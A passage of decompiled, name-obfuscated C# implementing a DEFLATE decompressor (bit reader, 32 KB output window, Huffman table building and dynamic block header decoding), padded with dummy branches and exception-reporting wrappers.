                  0,
                  0,
                  0,
                  0,
                  1,
                  1,
                  1,
                  1,
                  2,
                  2,
                  2,
                  2,
                  3,
                  3,
                  3,
                  3,
                  4,
                  4,
                  4,
                  4,
                  5,
                  5,
                  5,
                  5,
                  0
                };
              }
            }
            while (false);
            if (true)
              \u0003.\u0001.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
            \u0003.\u0001.\u0004 = new int[30]
            {
              0,
              0,
              0,
              0,
              1,
              1,
              2,
              2,
              3,
              3,
              4,
              4,
              5,
              5,
              6,
              6,
              7,
              7,
              8,
              8,
              9,
              9,
              10,
              10,
              11,
              11,
              12,
              12,
              13,
              13
            };
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex);
          throw;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0001([In] int obj0)
      {
        int num1;
        try
        {
          if (this.\u0003 < obj0)
            goto label_5;
label_4:
          return (int) ((long) this.\u0001 & (long) ((1 << obj0) - 1));
label_5:
          if (this.\u0001 == this.\u0002)
            return -1;
          \u0003.\u0002 obj1 = this;
          int num2 = (int) obj1.\u0001;
          byte[] numArray1 = this.\u0001;
          \u0003.\u0002 obj2 = this;
          int num3 = obj2.\u0001;
          if (true)
            goto label_6;
label_3:
          obj2.\u0001 = num3 + 1;
          int index1 = num1;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = this.\u0001;
          num1 = this.\u0001++;
          int index2 = num1;
          int num5 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num6 = (num4 | num5) << this.\u0003;
          obj1.\u0001 = (uint) (num2 | num6);
          this.\u0003 += 16;
          goto label_4;
label_6:
          num1 = num3;
          goto label_3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0001([In] int obj0)
      {
        try
        {
          if (true)
            this.\u0001 >>= obj0;
          else
            goto label_4;
label_2:
          if (true)
            this.\u0003 -= obj0;
label_4:
          if (false)
            goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0003.\u0001(ex, (object) this, (object) local);
          throw;
        }
      }

      [SpecialName]
      public int \u0001()
      {
        int num;
        try
        {
          num = this.\u0003;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num;
      }

      [SpecialName]
      public int \u0002()
      {
        int num1;
        try
        {
          int num2 = this.\u0002 - this.\u0001;
          do
          {
            if (true)
              goto label_7;
label_6:
            continue;
label_7:
            int num3 = this.\u0003;
            do
            {
              if (true)
                num3 >>= 3;
            }
            while (false);
            num2 += num3;
            goto label_6;
          }
          while (false);
          num1 = num2;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num1;
      }

      public void \u0001()
      {
        try
        {
          this.\u0001 >>= this.\u0003 & 7;
          this.\u0003 &= -8;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool \u0001()
      {
        bool flag;
        try
        {
          flag = this.\u0001 == this.\u0002;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        int num3;
        try
        {
          num1 = 0;
          while (true)
          {
            if (this.\u0003 <= 0)
              goto label_6;
            else
              goto label_4;
label_1:
            int num4;
            if (true)
            {
              this.\u0001 >>= 8;
              this.\u0003 -= 8;
              num4 = obj2;
              if (true)
              {
                obj2 = num4 - 1;
                ++num1;
                continue;
              }
              goto label_12;
            }
            else
              goto label_17;
label_4:
            int num5 = obj2;
            int num6 = 0;
            int num7 = num5;
label_5:
            if (num7 > num6)
            {
              obj0[obj1++] = (byte) this.\u0001;
              goto label_1;
            }
label_6:
            int num8;
            for (int index = obj2; index == 0; index = num8)
            {
              num8 = num1;
              if (true)
                return num8;
            }
            num7 = this.\u0002;
            num6 = this.\u0001;
            if (true)
            {
              num2 = num7 - num6;
              num4 = obj2;
            }
            else
              goto label_5;
label_12:
            int num9 = num2;
            if (num4 <= num9)
              goto label_15;
label_13:
            if (true)
              obj2 = num2;
            else
              goto label_1;
label_15:
            if (false)
              goto label_13;
            else
              break;
          }
          Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
label_17:
          this.\u0001 += obj2;
          if ((this.\u0001 - this.\u0002 & 1) != 0)
          {
            byte[] numArray = this.\u0001;
            num3 = this.\u0001++;
            int index = num3;
            this.\u0001 = (uint) numArray[index] & (uint) byte.MaxValue;
            if (true)
              this.\u0003 = 8;
          }
          return num1 + obj2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) numArray, (object) local4, (object) local5);
          throw;
        }
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          if (false)
            goto label_10;
          else
            goto label_16;
label_1:
          int num2;
          int num3;
          if (num2 < num3)
            throw new InvalidOperationException();
          int num4 = obj1;
          int num5 = obj2;
          if (true)
            num1 = num4 + num5;
          else
            goto label_8;
label_4:
          int num6;
          if (0 <= obj1)
          {
            num2 = obj1;
            num3 = num1;
            if (true)
            {
              if (num2 <= num3)
              {
                int num7 = num1;
                if (true)
                {
                  num5 = obj0.Length;
                  num4 = num7;
                }
                else
                {
                  num6 = num7;
                  goto label_11;
                }
              }
              else
                goto label_9;
            }
            else
              goto label_1;
          }
          else
            goto label_9;
label_8:
          int num8 = num5;
          if (num4 <= num8)
            goto label_10;
label_9:
          throw new ArgumentOutOfRangeException();
label_10:
          num6 = obj2 & 1;
label_11:
          if (num6 != 0)
          {
            if (true)
            {
              this.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0003);
              this.\u0003 += 8;
            }
            else
              goto label_9;
          }
          this.\u0001 = obj0;
          this.\u0001 = obj1;
          if (true)
          {
            this.\u0002 = num1;
            return;
          }
          goto label_4;
label_16:
          int num9 = this.\u0001;
          num3 = this.\u0002;
          num2 = num9;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) numArray, (object) local2, (object) local3);
          throw;
        }
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0001 = 0;
      private int \u0002 = 0;

      public void \u0001([In] int obj0)
      {
        int num1;
        try
        {
          \u0003.\u0003 obj1 = this;
          int num2;
          num1 = num2 = obj1.\u0002;
          obj1.\u0002 = num2 + 1;
          if (num1 == 32768)
            throw new InvalidOperationException();
          byte[] numArray = this.\u0001;
          \u0003.\u0003 obj2 = this;
          int num3;
          num1 = num3 = obj2.\u0001;
          obj2.\u0001 = num3 + 1;
          int index = num1;
          int num4 = (int) (byte) obj0;
          numArray[index] = (byte) num4;
          this.\u0001 &= (int) short.MaxValue;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      private void \u0001([In] int obj0, [In] int obj1, [In] int obj2)
      {
label_0:
        int num1;
        try
        {
          do
          {
            while (true)
            {
              if (true)
              {
                if (true)
                {
                  int num2 = obj1;
                  int num3 = num2 - 1;
                  if (true)
                    goto label_12;
label_3:
                  obj0 = num2 & num3;
                  continue;
label_12:
                  obj1 = num3;
                  if (num2 > 0)
                  {
                    byte[] numArray = this.\u0001;
                    \u0003.\u0003 obj = this;
                    int num4 = obj.\u0001;
                    if (true)
                      goto label_10;
label_1:
                    obj.\u0001 = num4 + 1;
                    int index = num1;
                    int num5 = (int) this.\u0001[obj0++];
                    numArray[index] = (byte) num5;
                    if (true)
                      this.\u0001 &= (int) short.MaxValue;
                    int num6 = obj0;
                    num3 = (int) short.MaxValue;
                    num2 = num6;
                    goto label_3;
label_10:
                    num1 = num4;
                    goto label_1;
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                goto label_0;
            }
          }
          while (false);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2, (object) local3, (object) local4);
          throw;
        }
      }

      public void \u0001([In] int obj0, [In] int obj1)
      {
        int sourceIndex;
        int num1;
        int num2;
        try
        {
          int num3;
          int num4;
          int num5;
          if (true)
          {
            if (true)
            {
              num2 = (this.\u0002 += obj0);
              int num6 = num2;
              if (true)
              {
                if (num6 > 32768)
                  throw new InvalidOperationException();
                int num7 = this.\u0001 - obj1;
                num4 = (int) short.MaxValue;
                num3 = num7;
              }
              else
              {
                num5 = num6;
                goto label_20;
              }
            }
            else
              goto label_10;
          }
          else
            goto label_12;
label_6:
          sourceIndex = num3 & num4;
          num5 = 32768;
          goto label_20;
label_10:
          int num8 = this.\u0001;
          int num9 = num1;
          int num10 = num8;
label_11:
          if (num10 >= num9)
            goto label_17;
label_12:
          if (obj0 <= obj1)
          {
            Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0001, obj0);
            this.\u0001 += obj0;
            return;
          }
          while (true)
          {
            num3 = obj0;
            num4 = num3 - 1;
            if (true)
            {
              obj0 = num4;
              if (num3 > 0)
              {
                byte[] numArray = this.\u0001;
                num2 = this.\u0001++;
                int index = num2;
                int num11 = (int) this.\u0001[sourceIndex++];
                numArray[index] = (byte) num11;
              }
              else
                break;
            }
            else
              goto label_6;
          }
          return;
label_17:
          this.\u0001(sourceIndex, obj0, obj1);
          return;
label_20:
          int num12 = obj0;
          int num13 = num5 - num12;
          if (true)
            goto label_21;
label_7:
          num10 = sourceIndex;
          num9 = num1;
          if (true)
          {
            if (false)
            {
              num4 = num9;
              num3 = num10;
              goto label_6;
            }
            else if (num10 > num9)
              goto label_17;
            else
              goto label_10;
          }
          else
            goto label_11;
label_21:
          num1 = num13;
          goto label_7;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) sourceIndex;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) local4, (object) local5);
          throw;
        }
      }

      public int \u0001([In] \u0003.\u0002 obj0, [In] int obj1)
      {
        int num1;
        int num2;
        try
        {
          int val1 = obj1;
          while (true)
          {
            int val2 = 32768 - this.\u0002;
            obj1 = Math.Min(Math.Min(val1, val2), obj0.\u0002());
            do
            {
              int num3 = 32768 - this.\u0001;
              int num4;
              while (true)
              {
                num1 = num3;
                num4 = obj1;
                if (false)
                  num3 = num4;
                else
                  break;
              }
              int num5 = num1;
              if (num4 > num5)
              {
                num2 = obj0.\u0001(this.\u0001, this.\u0001, num1);
                if (num2 == num1)
                  num2 += obj0.\u0001(this.\u0001, 0, obj1 - num1);
                else
                  break;
              }
              else
                goto label_7;
            }
            while (false);
            goto label_9;
label_7:
            int num6 = obj0.\u0001(this.\u0001, this.\u0001, obj1);
            if (false)
            {
              val1 = num6;
              continue;
            }
            num2 = num6;
label_9:
            this.\u0001 = this.\u0001 + num2 & (int) short.MaxValue;
            if (false)
              goto label_7;
            else
              break;
          }
          this.\u0002 += num2;
          return num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          \u0003.\u0002 obj = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) this, (object) obj, (object) local3);
          throw;
        }
      }

      public int \u0001()
      {
        int num1;
        try
        {
          do
          {
            int num2 = 32768;
            if (num2 != 0)
              num2 -= this.\u0002;
            num1 = num2;
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num1;
      }

      public int \u0002()
      {
        int num;
        try
        {
          num = this.\u0002;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
label_0:
        int num1;
        int num2;
        int length;
        try
        {
          num1 = this.\u0001;
          int num3 = obj2;
          int num4;
          while (true)
          {
            int num5;
            for (int index = this.\u0002; num3 <= index; num3 = num5)
            {
              if (true)
              {
                num5 = this.\u0001 - this.\u0002 + obj2;
                int maxValue = (int) short.MaxValue;
                if (maxValue == 0)
                {
                  index = maxValue;
                }
                else
                {
                  num1 = num5 & maxValue;
                  goto label_6;
                }
              }
              else
                goto label_13;
            }
            if (true)
              obj2 = this.\u0002;
            else
              goto label_7;
label_6:
            num2 = obj2;
            length = obj2 - num1;
            if (length <= 0)
              goto label_11;
label_7:
            if (true)
            {
              if (true)
              {
                Array.Copy((Array) this.\u0001, 32768 - length, (Array) obj0, obj1, length);
                num4 = obj1;
                if (false)
                  num3 = num4;
                else
                  break;
              }
              else
                goto label_0;
            }
            else
              goto label_12;
          }
          int num6 = length;
          obj1 = num4 + num6;
          obj2 = num1;
label_11:
          Array.Copy((Array) this.\u0001, num1 - obj2, (Array) obj0, obj1, obj2);
label_12:
          this.\u0002 -= num2;
label_13:
          if (this.\u0002 < 0)
            throw new InvalidOperationException();
          return num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) length;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) numArray, (object) local4, (object) local5);
          throw;
        }
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0003.\u0004 \u0001;
      public static readonly \u0003.\u0004 \u0002;

      static \u0004()
      {
        int num1;
        byte[] numArray1;
        try
        {
          int length1 = 288;
          if (length1 != 0)
          {
            numArray1 = new byte[length1];
            length1 = 0;
          }
          num1 = length1;
          while (true)
          {
            if (num1 < 144)
            {
              if (true)
              {
                if (true)
                {
                  numArray1[num1++] = (byte) 8;
                  continue;
                }
                break;
              }
            }
            else
              goto label_20;
label_19:
            numArray1[num1++] = (byte) 9;
label_20:
            if (num1 < 256)
              goto label_19;
            else
              goto label_6;
          }
          goto label_13;
label_6:
          if (num1 >= 280)
          {
            int length2;
            while (true)
            {
              int num2 = num1;
              while (true)
              {
                if (num2 >= 288)
                {
                  \u0003.\u0004.\u0001 = new \u0003.\u0004(numArray1);
                  length2 = 32;
                  if (length2 == 0)
                    num2 = length2;
                  else
                    goto label_11;
                }
                else
                  break;
              }
              numArray1[num1++] = (byte) 8;
            }
label_11:
            numArray1 = new byte[length2];
            num1 = 0;
          }
          else
            goto label_21;
label_13:
          while (num1 < 32)
            numArray1[num1++] = (byte) 5;
          \u0003.\u0004.\u0002 = new \u0003.\u0004(numArray1);
          if (true)
            return;
label_21:
          numArray1[num1++] = (byte) 7;
          goto label_6;
        }
        catch (Exception ex)
        {
          byte[] numArray2 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0003.\u0001(ex, (object) numArray2, (object) local);
          throw;
        }
      }

      public \u0004([In] byte[] obj0)
      {
        try
        {
          this.\u0001(obj0);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0003.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }

      private void \u0001([In] byte[] obj0)
      {
        int[] numArray1;
        int num1;
        int[] numArray2;
        int index1;
        int num2;
        int length;
        int index2;
        int[] numArray3;
        int num3;
        int num4;
        int num5;
        int index3;
        int num6;
        int num7;
        int num8;
        int index4;
        int index5;
        int index6;
        int num9;
        int num10;
        int index7;
        try
        {
          int[] numArray4 = new int[16];
          if (true)
            goto label_27;
label_1:
          numArray3 = new int[16];
          for (index1 = 0; index1 < obj0.Length; ++index1)
          {
            num1 = (int) obj0[index1];
            if (num1 > 0)
            {
              int[] numArray5;
              numArray2 = numArray5 = numArray1;
              int index8 = num1;
              if (true)
                goto label_29;
label_3:
              numArray5[index8] = numArray2[(IntPtr) index7] + 1;
              continue;
label_29:
              index7 = index8;
              goto label_3;
            }
          }
          num2 = 0;
          length = 512;
          for (index2 = 1; index2 <= 15; ++index2)
          {
            numArray3[index2] = num2;
            num2 += numArray1[index2] << 16 - index2;
            if (index2 >= 10)
            {
              num3 = numArray3[index2] & 130944;
              num4 = num2 & 130944;
              length += num4 - num3 >> 16 - index2;
            }
          }
          this.\u0001 = new short[length];
          num5 = 512;
          for (index3 = 15; index3 >= 10; --index3)
          {
            num6 = num2 & 130944;
            num2 -= numArray1[index3] << 16 - index3;
            num7 = num2 & 130944;
            for (num8 = num7; num8 < num6; num8 += 128)
            {
              this.\u0001[(int) \u0003.\u0007.\u0001(num8)] = (short) (-num5 << 4 | index3);
              num5 += 1 << index3 - 9;
            }
          }
          for (index4 = 0; index4 < obj0.Length; ++index4)
          {
            index5 = (int) obj0[index4];
            if (index5 != 0)
            {
              num2 = numArray3[index5];
              index6 = (int) \u0003.\u0007.\u0001(num2);
              if (index5 <= 9)
              {
                do
                {
                  this.\u0001[index6] = (short) (index4 << 4 | index5);
                  index6 += 1 << index5;
                }
                while (index6 < 512);
              }
              else
              {
                num9 = (int) this.\u0001[index6 & 511];
                num10 = 1 << (num9 & 15);
                num9 = -(num9 >> 4);
                do
                {
                  this.\u0001[num9 | index6 >> 9] = (short) (index4 << 4 | index5);
                  index6 += 1 << index5;
                }
                while (index6 < num10);
              }
              numArray3[index5] = num2 + (1 << 16 - index5);
            }
          }
          return;
label_27:
          numArray1 = numArray4;
          goto label_1;
        }
        catch (Exception ex)
        {
          object[] objArray = new object[23]
          {
            (object) numArray1,
            (object) numArray3,
            (object) index1,
            (object) num1,
            (object) num2,
            (object) length,
            (object) index2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) index3,
            (object) num6,
            (object) num7,
            (object) num8,
            (object) index4,
            (object) index5,
            (object) index6,
            (object) num9,
            (object) num10,
            (object) numArray2,
            (object) (IntPtr) index7,
            (object) this,
            (object) obj0
          };
          \u0003.\u0001(ex, objArray);
          throw;
        }
      }

      public int \u0001([In] \u0003.\u0002 obj0)
      {
        int num1;
        int num2;
        int num3;
        int index;
        int num4;
        int num5;
        try
        {
          if ((index = obj0.\u0001(9)) < 0)
          {
            num5 = obj0.\u0001();
            index = obj0.\u0001(num5);
            num1 = (int) this.\u0001[index];
            if (num1 < 0 || (num1 & 15) > num5)
              return -1;
            obj0.\u0001(num1 & 15);
            return num1 >> 4;
          }
          if ((num1 = (int) this.\u0001[index]) < 0)
          {
            num2 = -(num1 >> 4);
            num3 = num1 & 15;
            if ((index = obj0.\u0001(num3)) >= 0)
            {
              num1 = (int) this.\u0001[num2 | index >> 9];
              obj0.\u0001(num1 & 15);
              return num1 >> 4;
            }
            num4 = obj0.\u0001();
            index = obj0.\u0001(num4);
            num1 = (int) this.\u0001[num2 | index >> 9];
            if ((num1 & 15) > num4)
              return -1;
            obj0.\u0001(num1 & 15);
            return num1 >> 4;
          }
          obj0.\u0001(num1 & 15);
          return num1 >> 4;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) num5;
          \u0003.\u0002 obj = obj0;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
          throw;
        }
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0003.\u0004 \u0001;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte \u0001;
      private int \u0007;
      private static readonly int[] \u0003;

      public bool \u0001([In] \u0003.\u0002 obj0)
      {
        int num1;
        int num2;
        int num3;
        byte num4;
        int num5;
        int num6;
        try
        {
          while (true)
          {
            num2 = this.\u0001;
            int num7;
            int num8;
            switch (num2)
            {
              case 0:
                this.\u0002 = obj0.\u0001(5);
                if (this.\u0002 >= 0)
                {
                  this.\u0002 += 257;
                  obj0.\u0001(5);
                  this.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_1;
              case 1:
                if (true)
                {
                  this.\u0003 = obj0.\u0001(5);
                  if (this.\u0003 >= 0)
                  {
                    ++this.\u0003;
                    obj0.\u0001(5);
                    this.\u0005 = this.\u0002 + this.\u0003;
                    this.\u0002 = new byte[this.\u0005];
                    this.\u0001 = 2;
                    goto case 2;
                  }
                  else
                    goto label_5;
                }
                else
                  goto label_5;
              case 2:
                this.\u0004 = obj0.\u0001(4);
                if (this.\u0004 >= 0)
                {
                  this.\u0004 += 4;
                  obj0.\u0001(4);
                  this.\u0001 = new byte[19];
                  this.\u0007 = 0;
                  this.\u0001 = 3;
                  goto case 3;
                }
                else
                  goto label_8;
              case 3:
                for (; this.\u0007 < this.\u0004; ++this.\u0007)
                {
                  num1 = obj0.\u0001(3);
                  if (num1 < 0)
                    return false;
                  obj0.\u0001(3);
                  this.\u0001[\u0003.\u0005.\u0003[this.\u0007]] = (byte) num1;
                }
                this.\u0001 = new \u0003.\u0004(this.\u0001);
                this.\u0001 = (byte[]) null;
                this.\u0007 = 0;
                this.\u0001 = 4;
                goto case 4;
              case 4:
                while (((num3 = this.\u0001.\u0001(obj0)) & -16) == 0)
                {
                  byte[] numArray = this.\u0002;
                  num2 = this.\u0007++;
                  int index = num2;
                  this.\u0001 = num4 = (byte) num3;
                  int num9 = (int) num4;
                  numArray[index] = (byte) num9;
                  if (this.\u0007 == this.\u0005)
                    return true;
                }
                if (num3 >= 0)
                {
                  num7 = num3;
                  num8 = 17;
                  if (num8 != 0)
                  {
                    if (num7 >= num8)
                      this.\u0001 = (byte) 0;
                    this.\u0006 = num3 - 16;
                    this.\u0001 = 5;
                    goto case 5;
                  }
                  else
                    goto label_29;
                }
                else
                  goto label_19;
              case 5:
                num5 = \u0003.\u0005.\u0002[this.\u0006];
                num6 = obj0.\u0001(num5);
                if (num6 >= 0)
                {
                  obj0.\u0001(num5);
                  num6 += \u0003.\u0005.\u0001[this.\u0006];
                  break;
                }
                goto label_25;
              default:
                continue;
            }
label_28:
            num7 = num8 = num6;
label_29:
            num6 = num8 - 1;
            if (num7 > 0)
            {
              byte[] numArray = this.\u0002;
              num2 = this.\u0007++;
              int index = num2;
              int num10 = (int) this.\u0001;
              numArray[index] = (byte) num10;
              goto label_28;
            }
            else if (this.\u0007 != this.\u0005)
              this.\u0001 = 4;
            else
              goto label_31;
          }
label_1:
          return false;
label_5:
          return false;
label_8:
          return false;
label_19:
          return false;
label_25:
          return false;
label_31:
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<byte> local6 = (ValueType) num4;
          \u0003.\u0002 obj = obj0;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
          throw;
        }
      }

      public \u0003.\u0004 \u0001()
      {
        byte[] destinationArray;
        try
        {
          do
          {
            destinationArray = new byte[this.\u0002];
          }
          while (false);
          Array.Copy((Array) this.\u0002, 0, (Array) destinationArray, 0, this.\u0002);
          return new \u0003.\u0004(destinationArray);
        }
        catch (Exception ex)
        {
          byte[] numArray = destinationArray;
          \u0003.\u0001(ex, (object) numArray, (object) this);
          throw;
        }
      }

      public \u0003.\u0004 \u0002()
      {
        \u0003.\u0004 obj;
        byte[] destinationArray;
        try
        {
          byte[] numArray = new byte[this.\u0003];
          if (true)
            goto label_2;
label_1:
          if (true)
          {
            Array.Copy((Array) this.\u0002, this.\u0002, (Array) destinationArray, 0, this.\u0003);
            if (true)
            {
              obj = new \u0003.\u0004(destinationArray);
              goto label_6;
            }
            else
              goto label_6;
          }
          else
            goto label_6;
label_2:
          destinationArray = numArray;
          goto label_1;
        }
        catch (Exception ex)
        {
          byte[] numArray = destinationArray;
          \u0003.\u0001(ex, (object) numArray, (object) this);
          throw;
        }
label_6:
        return obj;
      }

      static \u0005()
      {
        try
        {
          \u0003.\u0005.\u0001 = new int[3]
          {
            3,
            3,
            11
          };
          \u0003.\u0005.\u0002 = new int[3]{ 2, 3, 7 };
          \u0003.\u0005.\u0003 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex);
          throw;
        }
      }
    }

    internal sealed class \u0006
    {
      private int \u0001 = 16;
      private long \u0001 = 0;
      private \u0003.\u000E \u0001;
      private \u0003.\u0008 \u0001;

      public \u0006()
      {
        try
        {
          this.\u0001 = new \u0003.\u000E();
          this.\u0001 = new \u0003.\u0008(this.\u0001);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public long \u0001()
      {
        long num;
        try
        {
          num = this.\u0001;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return num;
      }

      public void \u0001()
      {
        try
        {
          if (false)
            return;
          this.\u0001 |= 12;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool \u0001()
      {
        bool flag;
        try
        {
          do
          {
            int num;
            if (this.\u0001 != 30)
            {
              num = 0;
              if (num == 0)
                flag = num != 0;
              else
                goto label_4;
            }
            else
              goto label_3;
label_2:
            continue;
label_3:
            num = this.\u0001.\u0001() ? 1 : 0;
label_4:
            flag = num != 0;
            if (false)
              goto label_2;
            else
              break;
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }

      [SpecialName]
      public bool \u0002()
      {
        bool flag;
        try
        {
          flag = this.\u0001.\u0001();
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }

      public void \u0001([In] byte[] obj0)
      {
        try
        {
          this.\u0001.\u0001(obj0);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0003.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }

      public int \u0001([In] byte[] obj0)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int num5;
        try
        {
          int num6 = 0;
label_25:
          num2 = num6;
          int num7 = obj0.Length;
label_26:
          num3 = num7;
          int num8 = num3;
          if (true)
            num4 = num8;
          while (true)
          {
            int num9;
            int num10;
            int num11;
            do
            {
              do
              {
                int num12 = this.\u0001.\u0001(obj0, num2, num3);
                int num13;
                while (true)
                {
                  num1 = num12;
                  num13 = num2 + num1;
                  if (false)
